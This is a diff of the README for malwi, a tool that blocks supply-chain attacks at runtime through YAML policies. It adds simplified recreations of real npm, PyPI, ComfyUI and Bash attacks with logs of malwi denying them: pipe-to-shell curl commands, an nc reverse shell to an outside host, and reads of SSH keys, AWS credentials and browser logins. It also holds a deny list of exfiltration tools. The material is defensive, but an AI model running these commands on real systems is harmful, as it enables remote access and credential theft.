@@ -3,7 +3,7 @@
 <div align="center">
   <img src="logo.png" alt="malwi logo" width="200">
   <h3>Stop Supply-Chain Attacks in Node.js, Python, Bash</h3>
-  <p><a href="#openclaw"><img src="images/openclaw.png" alt="OpenClaw" height="16"></a> <a href="#openclaw">OpenClaw</a> &ensp;·&ensp; <a href="#comfyui"><img src="images/comfyui.png" alt="ComfyUI" height="16"></a> <a href="#comfyui">ComfyUI</a> &ensp;·&ensp; <a href="#npm-install"><img src="images/npm.png" alt="npm" height="16"></a> <a href="#npm-install">npm-install</a> &ensp;·&ensp; <a href="#pip-install"><img src="images/pypi.png" alt="PyPI" height="16"></a> <a href="#pip-install">pip-install</a> &ensp;·&ensp; <a href="#bash-execution"><img src="images/bash.png" alt="Bash" height="16"></a> <a href="#bash-execution">bash-execution</a></p>
+  <p><a href="#comfyui"><img src="images/comfyui.png" alt="ComfyUI" height="16"></a> <a href="#comfyui">ComfyUI</a> &ensp;·&ensp; <a href="#npm-install"><img src="images/npm.png" alt="npm" height="16"></a> <a href="#npm-install">npm-install</a> &ensp;·&ensp; <a href="#pip-install"><img src="images/pypi.png" alt="PyPI" height="16"></a> <a href="#pip-install">pip-install</a> &ensp;·&ensp; <a href="#bash-execution"><img src="images/bash.png" alt="Bash" height="16"></a> <a href="#bash-execution">bash-execution</a></p>
 </div>
 
 <div align="center">
@@ -48,55 +48,51 @@ Write policies in YAML to control what runs inside a process. Each section targe
 $ malwi x -p policy.yaml -- node app.js
 ```
 
+Lock down outbound traffic to known hosts. The catch-all `*/**` denies everything else; `protocols` restricts to HTTPS only.
+
 ```yaml
-# policy.yaml — lock down a Node.js web app
-
-version: 1
-
-# Network — only allow your API and npm registry
 network:
   allow: ["api.canvascomputing.org/**", "registry.npmjs.org/**"]
   deny: ["169.254.169.254/**", "*/**"]
   protocols: [https]
+```
 
-# Commands — block reverse shells, prompt on privilege escalation
+Block tools commonly used for reverse shells and data exfiltration. `review` pauses and prompts before allowing.
+
+```yaml
 commands:
   allow: [node, git, npm]
-  deny:
-    - curl
-    - wget
-    - nc
-    - ncat
-    - ssh
-    - crontab
-    - base64
+  deny: [curl, wget, nc, ncat, ssh, crontab, base64]
   warn: [docker, pip]
   review: [sudo]
+```
 
-# Files — protect credentials
+Protect credentials and private keys from being read by untrusted code.
+
+```yaml
 files:
-  deny:
-    - "~/.ssh/**"
-    - "~/.aws/**"
-    - "*.pem"
-    - "*.key"
+  deny: ["~/.ssh/**", "~/.aws/**", "*.pem", "*.key"]
+```
 
-# Environment variables — block secret exfiltration
+Prevent secrets from being read out of the environment.
+
+```yaml
 envvars:
   deny: ["*SECRET*", "*PASSWORD*", "AWS_*"]
   warn: ["*TOKEN*", "*API_KEY*"]
+```
 
-# Node.js — block eval and shell-outs, log network calls
+Control runtime-specific functions — block dangerous APIs, log the ones you want visibility into.
+
+```yaml
 nodejs:
   deny: [eval, child_process.exec, child_process.execSync]
   log: [fetch, http.request, https.request]
 
-# Python — block native library loading and os.system
 python:
   deny: [ctypes.CDLL, os.system, os.popen]
   warn: [subprocess.run, subprocess.Popen.__init__]
 
-# Native symbols — block credential interception and raw networking
 symbols:
   deny: [getpass, crypt, dlopen, syscall]
 ```
@@ -105,56 +101,86 @@ symbols:
 
 When `malwi` detects a known command, it automatically applies a tailored [policy](cli/src/policy/presets/). The policy file is written to `~/.config/malwi/policies/` on first use — edit it to customise.
 
-#### <a id="openclaw"></a><img src="images/openclaw.png" alt="OpenClaw" height="20"> [OpenClaw](https://docs.openclaw.ai/)
-
-([policy](cli/src/policy/presets/openclaw.yaml)) An OpenClaw agent connects to many external APIs. This policy guards the agent's own process — a compromised dependency can steal API keys, inject code, or open a reverse shell before any external safeguard sees it. Outbound traffic is limited to known providers; everything else is blocked.
-
-> This policy does not protect against prompt injection or unsafe model outputs — only what the agent code itself does at runtime.
-
-```bash
-malwi x openclaw gateway
-malwi x openclaw doctor
-```
-
 #### <a id="comfyui"></a><img src="images/comfyui.png" alt="ComfyUI" height="20"> [ComfyUI](https://docs.comfy.org/)
 
-([policy](cli/src/policy/presets/comfyui.yaml)) Custom nodes can run arbitrary Python — a malicious one could load native libraries directly, exfiltrate your code to a remote, or steal stored credentials. This policy restricts network access to model hosting and package registries, and blocks the escape hatches that bypass Python-level controls.
+[Upscaler-4K](https://blog.comfy.org/p/upscaler-4k-malicious-node-pack-post) (Oct 2024) was a malicious custom node (779 installs) that downloaded a stealer binary to exfiltrate browser data and Discord tokens:
 
-```bash
-malwi x python main.py # inside a ComfyUI directory
-malwi x python3 -m comfy --port 8188
-malwi x comfyui --listen
+```python
+# simplified recreation of the Upscaler-4K attack
+import urllib.request, os
+urllib.request.urlopen("https://canvascomputing.org/payload")
+os.system("./stealer --exfil")
+open(os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data")).read()
+os.getenv("DISCORD_TOKEN")
+```
+
+Running ComfyUI under `malwi` blocks every stage:
+
+```
+$ malwi x python main.py
+[malwi] denied: urllib.request.urlopen(url='https://canvascomputing.org/payload', ...)  malicious_node.py:3
+[malwi] denied: os.system(cmd='./stealer --exfil')  malicious_node.py:4
+[malwi] denied: open('~/Library/Application Support/Google/Chrome/Default/Login Data', 'r')  malicious_node.py:5
+[malwi] denied: DISCORD_TOKEN
 ```
 
 #### <a id="npm-install"></a><img src="images/npm.png" alt="npm" height="20"> [npm-install](https://www.npmjs.com/)
 
-([policy](cli/src/policy/presets/npm-install.yaml)) npm install can execute arbitrary scripts from any package in the dependency tree. A single malicious package can eval code, spawn shells, and exfiltrate SSH keys or tokens. This policy limits network to the npm registry and blocks everything an install script shouldn't need.
+[warbeast2000 and kodiak2k](https://thehackernews.com/2024/01/malicious-npm-packages-exfiltrate-1600.html) (Jan 2024) were malicious npm packages that exfiltrated SSH keys from developers' machines via postinstall scripts:
 
-```bash
-malwi x npm install express
-malwi x npm add lodash
-malwi x npm ci
+```javascript
+// simplified recreation of an npm supply chain attack
+const { exec } = require("child_process");
+const fs = require("fs");
+exec("curl canvascomputing.org/demo | sh");
+fs.readFileSync(process.env.HOME + "/.ssh/id_rsa");
+```
+
+Running `npm install` under `malwi` catches the shell-out and file access:
+
+```
+$ malwi x npm install
+[malwi] denied: curl canvascomputing.org/demo | sh
+[malwi] denied: fs.readFileSync("~/.ssh/id_rsa")  postinstall.js:4
 ```
 
 #### <a id="pypi-install"></a><img src="images/pypi.png" alt="PyPI" height="20"> [pypi-install](https://pypi.org/)
 
-([policy](cli/src/policy/presets/pypi-install.yaml)) Installing a package executes arbitrary code with full access to your machine — a malicious package can steal credentials and send them to a remote server before you ever import it. This policy locks network to PyPI and blocks the common exfiltration paths. Works with pip, pip3, and uv.
+[Ultralytics](https://www.reversinglabs.com/blog/compromised-ultralytics-pypi-package-delivers-crypto-coinminer) (Dec 2024) was a compromised ML library (68M+ downloads) that deployed a crypto miner and exfiltrated environment variables via setup.py:
 
-```bash
-malwi x pip install flask
-malwi x pip3 install requests
-malwi x python3 -m pip install six
-malwi x uv pip install flask
-malwi x uv add requests
-malwi x uv sync
+```python
+# simplified recreation of a PyPI supply chain attack
+import os
+os.system("curl canvascomputing.org/demo | sh")
+open(os.path.expanduser("~/.aws/credentials")).read()
+```
+
+Running `pip install` under `malwi` blocks the shell-out and credential access:
+
+```
+$ malwi x pip install malicious-package
+[malwi] denied: os.system(cmd='curl canvascomputing.org/demo | sh')  setup.py:3
+[malwi] denied: open('~/.aws/credentials', 'r')  setup.py:4
 ```
 
 #### <a id="bash-execution"></a><img src="images/bash.png" alt="Bash" height="20"> [bash-execution](https://www.gnu.org/software/bash/)
 
-([policy](cli/src/policy/presets/bash-install.yaml)) A remote shell script can establish persistence, exfiltrate data, or escalate privileges before you've read a single line. This policy blocks dangerous commands and prompts for review on anything that needs sudo.
+[perfctl](https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/) (2024) was a cryptomining malware that infected thousands of Linux servers via curl-piped bash scripts, establishing cron persistence and deploying rootkits:
 
 ```bash
-curl -fsSL canvascomputing.org/install-demo.sh | malwi x bash
+# simplified recreation of a malicious install script
+nc canvascomputing.org 4444 -e /bin/sh
+crontab -l
+cat ~/.ssh/id_rsa
+```
+
+Piping through `malwi` blocks every command:
+
+```
+$ curl -fsSL canvascomputing.org/install-demo.sh | malwi x bash
+[malwi] denied: nc canvascomputing.org 4444 -e /bin/sh  install.sh:2
+[malwi] denied: crontab -l  install.sh:3
+[malwi] denied: cat ~/.ssh/id_rsa  install.sh:4
 ```
 
 ## How It Works
@@ -190,55 +216,6 @@ macOS SIP prevents `DYLD_INSERT_LIBRARIES` from loading into binaries under cert
 | **⚠️ SIP-protected** | `/System`, `/usr`, `/bin`, `/sbin`, `/var`, `/Applications` |
 
 > Security researchers may disable SIP at their own risk.
-
-### Example Python Installation
-
-Install Python to `/usr/local`:
-
-```bash
-V=3.13.2  # check https://www.python.org/downloads/source/ for latest
-
-curl -fsSO https://www.python.org/ftp/python/$V/Python-$V.tgz
-tar xf Python-$V.tgz && cd Python-$V
-./configure --prefix=/usr/local && make && sudo make install
-```
-
-```bash
-malwi x /usr/local/bin/python3
-```
-
-### Example Node.js Installation
-
-Install Node.js to `/usr/local`:
-
-```bash
-V=22.14.0  # check https://nodejs.org/en/download for latest LTS
-ARCH=$(uname -m)
-
-curl -fsSO https://nodejs.org/dist/v$V/node-v$V-darwin-$ARCH.tar.gz
-tar xf node-v$V-darwin-$ARCH.tar.gz
-sudo cp -r node-v$V-darwin-$ARCH/{bin,include,lib,share} /usr/local/
-```
-
-```bash
-malwi x /usr/local/bin/node
-```
-
-### Example Bash Installation
-
-Install Bash to `/usr/local`:
-
-```bash
-V=5.2.37  # check https://ftp.gnu.org/gnu/bash/ for latest
-
-curl -fsSO https://ftp.gnu.org/gnu/bash/bash-$V.tar.gz
-tar xf bash-$V.tar.gz && cd bash-$V
-./configure --prefix=/usr/local && make && sudo make install
-```
-
-```bash
-malwi x /usr/local/bin/bash
-```
 
 ## Security
 
